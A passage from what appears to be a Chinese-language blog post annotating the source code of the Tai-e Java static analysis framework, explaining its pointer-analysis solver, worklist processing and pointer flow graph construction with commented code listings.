class="variable">options</span> <span class="operator">=</span> getOptions();</span><br><span class="line">    <span class="comment">// 根据配置，生成heapModel 堆模型</span></span><br><span class="line">    <span class="type">HeapModel</span> <span class="variable">heapModel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AllocationSiteBasedModel</span>(options);</span><br><span class="line">    <span class="type">ContextSelector</span> <span class="variable">selector</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">advanced</span> <span class="operator">=</span> options.getString(<span class="string">&quot;advanced&quot;</span>);</span><br><span class="line">    <span class="comment">// 根据配置中的cs字段，生成上下文管理器</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cs</span> <span class="operator">=</span> options.getString(<span class="string">&quot;cs&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (advanced != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (advanced.equals(<span class="string">&quot;collection&quot;</span>)) &#123;</span><br><span class="line">            selector = ContextSelectorFactory.makeSelectiveSelector(cs,</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">CollectionMethods</span>(World.get().getClassHierarchy()).get());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// run context-insensitive analysis as pre-analysis</span></span><br><span class="line">            <span class="type">PointerAnalysisResult</span> <span class="variable">preResult</span> <span class="operator">=</span> runAnalysis(heapModel,</span><br><span class="line">                    ContextSelectorFactory.makeCISelector());</span><br><span class="line">            <span class="keyword">if</span> (advanced.startsWith(<span class="string">&quot;scaler&quot;</span>)) &#123;</span><br><span class="line">                selector = Timer.runAndCount(() -&gt; ContextSelectorFactory</span><br><span class="line">                                .makeGuidedSelector(Scaler.run(preResult, advanced)),</span><br><span class="line">                        <span class="string">&quot;Scaler&quot;</span>, Level.INFO);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (advanced.startsWith(<span class="string">&quot;zipper&quot;</span>)) &#123;</span><br><span class="line">                selector = Timer.runAndCount(() -&gt; ContextSelectorFactory</span><br><span class="line">                                .makeSelectiveSelector(cs, Zipper.run(preResult, advanced)),</span><br><span class="line">                        <span class="string">&quot;Zipper&quot;</span>, Level.INFO);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (advanced.equals(<span class="string">&quot;mahjong&quot;</span>)) &#123;</span><br><span class="line">                heapModel = Timer.runAndCount(() -&gt; Mahjong.run(preResult, options),</span><br><span class="line">                        <span class="string">&quot;Mahjong&quot;</span>, Level.INFO);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(</span><br><span class="line">                        <span class="string">&quot;Illegal advanced analysis argument: &quot;</span> + advanced);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (selector == <span class="literal">null</span>) &#123;</span><br><span class="line">        selector = ContextSelectorFactory.makePlainSelector(cs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> runAnalysis(heapModel, selector);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-3-DefaultSolver"><a href="#4-3-DefaultSolver" class="headerlink" title="4.3 DefaultSolver"></a>4.3 DefaultSolver</h2><p>PointerAnalysis.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> PointerAnalysisResult <span class="title function_">runAnalysis</span><span class="params">(HeapModel heapModel,</span></span><br><span class="line"><span class="params">                                          ContextSelector selector)</span> &#123;</span><br><span class="line">    <span class="type">AnalysisOptions</span> <span class="variable">options</span> <span class="operator">=</span> getOptions();</span><br><span class="line">    <span class="type">Solver</span> <span class="variable">solver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultSolver</span>(options,</span><br><span class="line">            heapModel, selector, <span class="keyword">new</span> <span class="title class_">MapBasedCSManager</span>());</span><br><span class="line">    <span class="comment">// The initialization of some Plugins may read the fields in solver,</span></span><br><span class="line">    <span class="comment">// e.g., contextSelector or csManager, thus we initialize Plugins</span></span><br><span class="line">    <span class="comment">// after setting all other fields of solver.</span></span><br><span class="line">    setPlugin(solver, options);</span><br><span class="line">    solver.solve();</span><br><span class="line">    <span class="keyword">return</span> solver.getResult();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-1-Fields"><a href="#4-3-1-Fields" class="headerlink" title="4.3.1 Fields"></a>4.3.1 Fields</h3><ul><li>propTypes</li><li>workList: 前文提到的WorkList结构，是整个指针分析的重点</li><li>options: 用户配置</li><li>heapModel: 堆模型</li><li>contextSelector: 上下文选择器</li><li>csManager: 上下文管理的，整个指针分析的结果</li><li>ptrManager: 指向关系</li><li>objManager: obj</li><li>mtdManager: method</li><li>callSites: call</li><li>hierarchy: 从World获取的类继承关系hierarchy = World.get().getClassHierarchy();</li><li>typeSystem: 从World获取的类型系统typeSystem = World.get().getTypeSystem();</li><li>ptsFactory</li><li>callGraph</li><li>pointerFlowGraph: 最终的PFG，其实最终还是放在csManager。</li></ul><h4 id="caManager只见get不见add-set"><a href="#caManager只见get不见add-set" class="headerlink" title="caManager只见get不见add/set"></a>caManager只见get不见add/set</h4><p>csManager中的几个feild是如何add值的？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> CSVar <span class="title function_">getCSVar</span><span class="params">(Context context, Var <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> vars.computeIfAbsent(<span class="keyword">var</span>, context,</span><br><span class="line">            (v, c) -&gt; <span class="keyword">new</span> <span class="title class_">CSVar</span>(v, c, counter++));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案是用了computeIfAbsent，不存在则添加。</p><p>其他一些类似结构也都是如此处理的。</p><h3 id="4-3-2-API"><a href="#4-3-2-API" class="headerlink" title="4.3.2 API"></a>4.3.2 API</h3><h4 id="workList相关"><a href="#workList相关" class="headerlink" title="workList相关"></a>workList相关</h4><p>其实前文也提到了两个关于workList的API</p><ul><li><p>addPointsTo(Pointer pointer, PointsToSet pts)：增加待处理的指向关系</p></li><li><p>addCallEdge(Edge&lt;CSCallSite, CSMethod&gt; edge)：增加待处理的call调用关系<br>还有一些派生的添加WorkList的API</p></li><li><p>addPointsTo(Pointer pointer, Context heapContext, Obj obj)</p></li><li><p>addVarPointsTo(Context context, Var var, PointsToSet pts)</p></li><li><p>addVarPointsTo(Context context, Var var, CSObj csObj)</p></li><li><p>addVarPointsTo(Context context, Var var, Context heapContext, Obj obj)<br>其最终都是调用的addPointsTo(Pointer pointer, PointsToSet pts)向workList 中增加pointerEntry。</p></li></ul><p>除此还有一些重点的API，一一讲解下</p><h4 id="addEntryPoint-EntryPoint-entryPoint"><a href="#addEntryPoint-EntryPoint-entryPoint" class="headerlink" title="addEntryPoint(EntryPoint entryPoint)"></a>addEntryPoint(EntryPoint entryPoint)</h4><p>EntryPoint是入口函数，一般是Main方法，Tai-e内置了一些隐式入口，比如Thread#run等，具体逻辑在EntryPointHandler plugin插件中。</p><p>addEntryPoint提供了统一的分析入口API，指针分析从此开始。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addEntryPoint</span><span class="params">(EntryPoint entryPoint)</span> &#123;</span><br><span class="line"><span class="comment">// 空上下文</span></span><br><span class="line">    <span class="type">Context</span> <span class="variable">entryCtx</span> <span class="operator">=</span> contextSelector.getEmptyContext();</span><br><span class="line">    <span class="comment">// 入口函数，IR格式</span></span><br><span class="line">    <span class="type">JMethod</span> <span class="variable">entryMethod</span> <span class="operator">=</span> entryPoint.getMethod();</span><br><span class="line">    <span class="comment">// 组合成上下文方法</span></span><br><span class="line">    <span class="type">CSMethod</span> <span class="variable">csEntryMethod</span> <span class="operator">=</span> csManager.getCSMethod(entryCtx, entryMethod);</span><br><span class="line">    <span class="comment">// callGraph 添加</span></span><br><span class="line">    callGraph.addEntryMethod(csEntryMethod);</span><br><span class="line">    <span class="comment">// 触发所有插件的新增CSMethod逻辑，具体逻辑看插件的处理</span></span><br><span class="line">    <span class="comment">// 注意这里会触发StmtProcessor，后文再讲</span></span><br><span class="line">    addCSMethod(csEntryMethod);</span><br><span class="line">    <span class="comment">// 获取IR</span></span><br><span class="line">    <span class="type">IR</span> <span class="variable">ir</span> <span class="operator">=</span> entryMethod.getIR();</span><br><span class="line">    <span class="comment">// pass this objects</span></span><br><span class="line">    <span class="keyword">if</span> (!entryMethod.isStatic()) &#123;</span><br><span class="line">    <span class="comment">// 针对目前的entryPoint，获取this obj</span></span><br><span class="line">        <span class="keyword">for</span> (Obj thisObj : entryPoint.getThisObjs()) &#123;</span><br><span class="line">        <span class="comment">// 在workList中添加一条待处理的pointEntry</span></span><br><span class="line">            <span class="comment">// 其中Var为entryCtx和ir组合</span></span><br><span class="line">            <span class="comment">// Obj为entryCtx和this obj</span></span><br><span class="line">            addVarPointsTo(entryCtx, ir.getThis(), entryCtx, thisObj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 处理参数</span></span><br><span class="line">    <span class="comment">// pass parameter objects</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; entryMethod.getParamCount(); ++i) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">param</span> <span class="operator">=</span> ir.getParam(i);</span><br><span class="line">        <span class="comment">// 判断是否是是配置的IR类型，比如</span></span><br><span class="line">        <span class="comment">// null，默认false</span></span><br><span class="line">        <span class="comment">// reference（ArrayType/ClassType），默认true</span></span><br><span class="line">        <span class="comment">// 内置primitiveType白名单</span></span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(param)) &#123;</span><br><span class="line">        <span class="comment">// 每一个参数param及paramObj，放入WorkList队列中</span></span><br><span class="line">            <span class="keyword">for</span> (Obj paramObj : entryPoint.getParamObjs(i)) &#123;</span><br><span class="line">                addVarPointsTo(entryCtx, param, entryCtx, paramObj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>疑问：以上只见到了this、param 添加到workList，里面的各个IR呢？后文StmtProcessor详细解读</p></blockquote><h4 id="propagate-Pointer-pointer-PointsToSet-pointsToSet"><a href="#propagate-Pointer-pointer-PointsToSet-pointsToSet" class="headerlink" title="propagate(Pointer pointer, PointsToSet pointsToSet)"></a>propagate(Pointer pointer, PointsToSet pointsToSet)</h4><p>功能：目的是将Pointer内原有的pointsToSet和新的pointsToSet整合。</p><p>先看参数Pointer，他是个接口，有以下的一些实现：</p><ul><li>AbstractPointer</li><li>CSVar</li><li>ArrayIndex</li><li>InstanceField</li><li>StaticField<br>其中AbstractPointer是抽象实现，其他是个是指针分析最终要求解的结果中的“Variable/Field”<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> PointsToSet <span class="title function_">propagate</span><span class="params">(Pointer pointer, PointsToSet pointsToSet)</span> &#123;</span><br><span class="line">    logger.trace(<span class="string">&quot;Propagate &#123;&#125; to &#123;&#125;&quot;</span>, pointsToSet, pointer);</span><br><span class="line">    <span class="comment">// 先取出原pointer的filter</span></span><br><span class="line">    Set&lt;Predicate&lt;CSObj&gt;&gt; filters = pointer.getFilters();</span><br><span class="line">    <span class="keyword">if</span> (!filters.isEmpty()) &#123;</span><br><span class="line">    <span class="comment">// 待处理的pointsToSet先过一遍filter，组合成新的pointsToSet</span></span><br><span class="line">        <span class="comment">// apply filters (of the pointer) on pointsToSet</span></span><br><span class="line">        pointsToSet = pointsToSet.objects()</span><br><span class="line">                .filter(o -&gt; filters.stream().allMatch(f -&gt; f.test(o)))</span><br><span class="line">                .collect(ptsFactory::make, PointsToSet::addObject, PointsToSet::addAll);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 原pointer的pointsToSet添加上所有新的符合filter的pointsToSet</span></span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">diff</span> <span class="operator">=</span> getPointsToSetOf(pointer).addAllDiff(pointsToSet);</span><br><span class="line">    <span class="comment">// TODO：待添加分析</span></span><br><span class="line">    <span class="keyword">if</span> (!diff.isEmpty()) &#123;</span><br><span class="line">        pointerFlowGraph.getOutEdgesOf(pointer).forEach(edge -&gt; &#123;</span><br><span class="line">            <span class="type">Pointer</span> <span class="variable">target</span> <span class="operator">=</span> edge.target();</span><br><span class="line">            edge.getTransfers().forEach(transfer -&gt;</span><br><span class="line">                    addPointsTo(target, transfer.apply(edge, diff)));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> diff;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>TODO: 边的处理待解释，猜测如果是有指向关系，那么把也要把新的pts合并过去。</p></blockquote></li></ul><h4 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h4><p>analyze是整个Solver的核心逻辑，围绕workList，从中取值并处理，直至为空，整个指针分析过程完毕。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">analyze</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (!workList.isEmpty() &amp;&amp; !isTimeout) &#123;</span><br><span class="line">        WorkList.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> workList.pollEntry();</span><br><span class="line">        <span class="keyword">if</span> (entry <span class="keyword">instanceof</span> WorkList.PointerEntry pEntry) &#123;</span><br><span class="line">            <span class="type">Pointer</span> <span class="variable">p</span> <span class="operator">=</span> pEntry.pointer();</span><br><span class="line">            <span class="type">PointsToSet</span> <span class="variable">pts</span> <span class="operator">=</span> pEntry.pointsToSet();</span><br><span class="line">            <span class="type">PointsToSet</span> <span class="variable">diff</span> <span class="operator">=</span> propagate(p, pts);</span><br><span class="line">            <span class="keyword">if</span> (!diff.isEmpty() &amp;&amp; p <span class="keyword">instanceof</span> CSVar v) &#123;</span><br><span class="line">            <span class="comment">// 处理InstanceStore</span></span><br><span class="line">                processInstanceStore(v, diff);</span><br><span class="line">                processInstanceLoad(v, diff);</span><br><span class="line">                processArrayStore(v, diff);</span><br><span class="line">                processArrayLoad(v, diff);</span><br><span class="line">                processCall(v, diff);</span><br><span class="line">                plugin.onNewPointsToSet(v, diff);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (entry <span class="keyword">instanceof</span> WorkList.CallEdgeEntry eEntry) &#123;</span><br><span class="line">            processCallEdge(eEntry.edge());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!workList.isEmpty() &amp;&amp; isTimeout) &#123;</span><br><span class="line">        logger.warn(<span class="string">&quot;Pointer analysis stops early as it reaches time limit (&#123;&#125; seconds),&quot;</span> +</span><br><span class="line">                <span class="string">&quot; and the result may be unsound!&quot;</span>, timeLimit);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (timeLimiter != <span class="literal">null</span>) &#123; <span class="comment">// finish normally but time limiter is still running</span></span><br><span class="line">        timeLimiter.stop();</span><br><span class="line">    &#125;</span><br><span class="line">    plugin.onFinish();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中有涉及到几种类型的处理</p><ul><li>PointerEntry</li><li>InstanceStore</li><li>InstanceLoad</li><li>ArrayStore</li><li>ArrayLoad</li><li>Call</li><li>CallEdgeEntry</li><li>CallEdge</li></ul><h4 id="processInstanceStore-CSVar-baseVar-PointsToSet-pts"><a href="#processInstanceStore-CSVar-baseVar-PointsToSet-pts" class="headerlink" title="processInstanceStore(CSVar baseVar, PointsToSet pts)"></a>processInstanceStore(CSVar baseVar, PointsToSet pts)</h4><p>疑问：是指的课件中的存储吗？</p><p><img src="/images/pasted-777.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processInstanceStore</span><span class="params">(CSVar baseVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> baseVar.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> baseVar.getVar();</span><br><span class="line">    <span class="comment">// 获取Var中的StoreField，参考前文Var结构一节</span></span><br><span class="line">    <span class="keyword">for</span> (StoreField store : <span class="keyword">var</span>.getStoreFields()) &#123;</span><br><span class="line">    <span class="comment">// 右侧的Var</span></span><br><span class="line">        <span class="type">Var</span> <span class="variable">fromVar</span> <span class="operator">=</span> store.getRValue();</span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(fromVar)) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">from</span> <span class="operator">=</span> csManager.getCSVar(context, fromVar);</span><br><span class="line">            <span class="comment">// 获取filed</span></span><br><span class="line">            <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> store.getFieldRef().resolve();</span><br><span class="line">            <span class="comment">// pts每一个Obj</span></span><br><span class="line">            pts.forEach(baseObj -&gt; &#123;</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">                <span class="keyword">if</span> (baseObj.getObject().isFunctional()) &#123;</span><br><span class="line">                <span class="comment">// 获取其对应的field</span></span><br><span class="line">                    <span class="type">InstanceField</span> <span class="variable">instField</span> <span class="operator">=</span> csManager.getInstanceField(baseObj, field);</span><br><span class="line">                    <span class="comment">// 如课件图，在最终的PFG图中，增加一条oi-&gt;oj的边</span></span><br><span class="line">                    addPFGEdge(from, instField, FlowKind.INSTANCE_STORE);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>疑问：途中是oi-&gt;oj，这里实际是Pointer-&gt;Pointer(CSVar-&gt;InstanceField)。</p></blockquote><p>顺带看看addPFGEdge(Pointer source, Pointer target, FlowKind kind,Transfer transfer)</p><h4 id="addPFGEdge-Pointer-source-Pointer-target-FlowKind-kind-Transfer-transfer"><a href="#addPFGEdge-Pointer-source-Pointer-target-FlowKind-kind-Transfer-transfer" class="headerlink" title="addPFGEdge(Pointer source, Pointer target, FlowKind kind,Transfer transfer)"></a>addPFGEdge(Pointer source, Pointer target, FlowKind kind,Transfer transfer)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addPFGEdge</span><span class="params">(Pointer source, Pointer target, FlowKind kind,</span></span><br><span class="line"><span class="params">                       Transfer transfer)</span> &#123;</span><br><span class="line">    <span class="comment">// source的边Edge添加一条边</span></span><br><span class="line">    <span class="type">PointerFlowEdge</span> <span class="variable">edge</span> <span class="operator">=</span> pointerFlowGraph.getOrAddEdge(kind, source, target);</span><br><span class="line">    <span class="keyword">if</span> (edge != <span class="literal">null</span> &amp;&amp; edge.addTransfer(transfer)) &#123;</span><br><span class="line">    <span class="comment">// 获取source原本的pts</span></span><br><span class="line">        <span class="type">PointsToSet</span> <span class="variable">targetSet</span> <span class="operator">=</span> transfer.apply(edge, getPointsToSetOf(source));</span><br><span class="line">        <span class="keyword">if</span> (!targetSet.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// 添加到workList中</span></span><br><span class="line">            addPointsTo(target, targetSet);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：可以看出，addPFGEdge不只是增加一条边，还有把原来的source pts整合进target中，不需要再单独的addPointsTo。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PointerFlowEdge <span class="title function_">getOrAddEdge</span><span class="params">(FlowKind kind, Pointer source, Pointer target)</span> &#123;</span><br><span class="line"><span class="comment">// Var中添加一条边</span></span><br><span class="line">    <span class="keyword">return</span> source.getOrAddEdge(kind, source, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AbstractPointer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PointerFlowEdge <span class="title function_">getOrAddEdge</span><span class="params">(FlowKind kind, Pointer source, Pointer target)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (successors.add(target)) &#123;</span><br><span class="line">        <span class="type">PointerFlowEdge</span> <span class="variable">edge</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PointerFlowEdge</span>(kind, source, target);</span><br><span class="line">        outEdges.add(edge);</span><br><span class="line">        <span class="keyword">return</span> edge;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (kind == FlowKind.OTHER) &#123;</span><br><span class="line">        <span class="keyword">for</span> (PointerFlowEdge edge : outEdges) &#123;</span><br><span class="line">            <span class="keyword">if</span> (edge.target().equals(target)) &#123;</span><br><span class="line">                <span class="keyword">return</span> edge;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>successors 添加target</li><li>outEdges 添加一条到target的边</li></ul><h4 id="processInstanceLoad-CSVar-baseVar-PointsToSet-pts"><a href="#processInstanceLoad-CSVar-baseVar-PointsToSet-pts" class="headerlink" title="processInstanceLoad(CSVar baseVar, PointsToSet pts)"></a>processInstanceLoad(CSVar baseVar, PointsToSet pts)</h4><p><img src="/images/pasted-778.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processInstanceLoad</span><span class="params">(CSVar baseVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> baseVar.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> baseVar.getVar();</span><br><span class="line">    <span class="keyword">for</span> (LoadField load : <span class="keyword">var</span>.getLoadFields()) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">toVar</span> <span class="operator">=</span> load.getLValue();</span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(toVar)) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">to</span> <span class="operator">=</span> csManager.getCSVar(context, toVar);</span><br><span class="line">            <span class="type">JField</span> <span class="variable">field</span> <span class="operator">=</span> load.getFieldRef().resolve();</span><br><span class="line">            pts.forEach(baseObj -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (baseObj.getObject().isFunctional()) &#123;</span><br><span class="line">                    <span class="type">InstanceField</span> <span class="variable">instField</span> <span class="operator">=</span> csManager.getInstanceField(baseObj, field);</span><br><span class="line">                    addPFGEdge(instField, to, FlowKind.INSTANCE_LOAD);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似的逻辑，不赘述</p><p><img src="/images/pasted-779.png" alt="upload successful"></p><h4 id="processArrayStore-CSVar-arrayVar-PointsToSet-pts"><a href="#processArrayStore-CSVar-arrayVar-PointsToSet-pts" class="headerlink" title="processArrayStore(CSVar arrayVar, PointsToSet pts)"></a>processArrayStore(CSVar arrayVar, PointsToSet pts)</h4><p>ArrayStore 与FieldStore类似</p><ul><li><p>store field: v.f = x;</p></li><li><p>store array: v[i] = x;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processArrayStore</span><span class="params">(CSVar arrayVar, PointsToSet pts)</span> &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> arrayVar.getContext();</span><br><span class="line">    <span class="type">Var</span> <span class="variable">var</span> <span class="operator">=</span> arrayVar.getVar();</span><br><span class="line">    <span class="keyword">for</span> (StoreArray store : <span class="keyword">var</span>.getStoreArrays()) &#123;</span><br><span class="line">        <span class="type">Var</span> <span class="variable">rvalue</span> <span class="operator">=</span> store.getRValue();</span><br><span class="line">        <span class="keyword">if</span> (propTypes.isAllowed(rvalue)) &#123;</span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">from</span> <span class="operator">=</span> csManager.getCSVar(context, rvalue);</span><br><span class="line">            pts.forEach(array -&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (array.getObject().isFunctional()) &#123;</span><br><span class="line">                    <span class="type">ArrayIndex</span> <span class="variable">arrayIndex</span> <span class="operator">=</span> csManager.getArrayIndex(array);</span><br><span class="line">                    <span class="comment">// we need type guard for array stores as Java arrays</span></span><br><span 